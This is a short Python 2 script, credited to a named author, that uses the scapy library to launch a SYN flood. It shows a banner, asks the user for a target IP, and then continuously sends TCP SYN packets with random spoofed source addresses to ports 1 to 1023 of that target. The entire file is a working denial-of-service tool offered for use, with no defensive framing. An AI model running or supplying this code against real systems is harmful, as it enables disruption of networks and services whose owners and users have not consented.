#!/usr/bin/python
# Author   : Daniel Magevski
# Description : This scrpit will send IP packet with flag SYN on your networking with random IP source

import sys
import os
from scapy.all import *

if os.geteuid() != 0:
        exit("You need to root prcivileges")

print "####################################################################"
print "                   WELCOME SYN FLOODING                             "
print "                    BY DANIEL MAGEVSKI                              "
print "                     .-.      .-.                                   "
print "                    /            \                                  "
print "                   |              |                                 "
print "                   | )(|_/  \|_)( |                                 "
print "                   |/     /\     \|                                 "
print "           _       (_     ^^     _)                                 "
print "   _\ ____) \_______\__|IIIIII|__/_______________________________   "
print "  (_)[___]{}<________|-\IIIIII/-|________________________________/  "
print "    /     )_/        \          /                                   "
print "                      \ ______ /                                    "
print "####################################################################"

print " [*] Ex 192.168.0.1"
IP_dst = raw_input(" Set IP target: ")

packet = IP(src=RandIP("*.*.*.*"),
            dst=IP_dst) / \
         TCP(dport=range(1,1024), flags="S")

print " Press Crtl+C to stop\n"
print " Flooding target " + IP_dst

#Sending the packet
srflood(packet)
